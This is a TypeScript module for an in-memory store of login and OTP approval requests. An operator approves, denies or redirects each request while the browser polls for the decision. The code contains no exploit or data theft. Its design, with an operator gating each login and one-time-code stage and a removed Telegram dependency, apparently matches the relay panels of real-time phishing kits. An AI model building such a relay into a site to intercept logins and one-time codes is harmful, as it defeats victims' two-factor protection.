import crypto from "node:crypto"

/**
 * Universal webhook approval store.
 *
 * Platform-agnostic (no Vercel or Telegram dependency): the site posts an
 * approval request to /api/webhook, the operator responds with an action
 * (approve / deny / redirect) against the request id, and the browser polls
 * /api/webhook/status for the decision.
 *
 * Requests live for a fixed waiting window. If no response arrives in time
 * the request expires and the status endpoint reports "expired".
 */

export const APPROVAL_WAIT_MS = 90_000

export type ApprovalStage = "login" | "otp"
export type ApprovalAction = "approve" | "deny" | "redirect"
export type ApprovalStatus = "pending" | ApprovalAction | "expired"

export interface ApprovalRequest {
  id: string
  stage: ApprovalStage
  userId: string
  createdAt: number
  expiresAt: number
  action: ApprovalAction | null
}

const globalStore = globalThis as typeof globalThis & {
  __webhookApprovals?: Map<string, ApprovalRequest>
}

function getStore(): Map<string, ApprovalRequest> {
  if (!globalStore.__webhookApprovals) {
    globalStore.__webhookApprovals = new Map<string, ApprovalRequest>()
  }
  return globalStore.__webhookApprovals
}

function pruneExpired(store: Map<string, ApprovalRequest>, now: number): void {
  // Remove decisions long past expiry so the map cannot grow unbounded.
  for (const [id, request] of store) {
    if (request.expiresAt + APPROVAL_WAIT_MS < now) {
      store.delete(id)
    }
  }
}

export function createApprovalRequest(
  stage: ApprovalStage,
  userId: string,
): ApprovalRequest {
  const store = getStore()
  const now = Date.now()
  pruneExpired(store, now)

  const request: ApprovalRequest = {
    id: crypto.randomUUID(),
    stage,
    userId: userId.trim(),
    createdAt: now,
    expiresAt: now + APPROVAL_WAIT_MS,
    action: null,
  }
  store.set(request.id, request)
  return request
}

export function resolveApprovalRequest(
  id: string,
  action: ApprovalAction,
): ApprovalRequest | null {
  const store = getStore()
  const now = Date.now()
  pruneExpired(store, now)

  const request = store.get(id)
  if (!request || request.action || request.expiresAt <= now) {
    return null
  }
  request.action = action
  return request
}

export function getApprovalStatus(id: string): {
  request: ApprovalRequest
  status: ApprovalStatus
  remainingMs: number
} | null {
  const store = getStore()
  const now = Date.now()
  pruneExpired(store, now)

  const request = store.get(id)
  if (!request) return null

  const remainingMs = Math.max(0, request.expiresAt - now)
  const status: ApprovalStatus = request.action ?? (remainingMs <= 0 ? "expired" : "pending")
  return { request, status, remainingMs }
}

export function isApprovalAction(value: unknown): value is ApprovalAction {
  return value === "approve" || value === "deny" || value === "redirect"
}
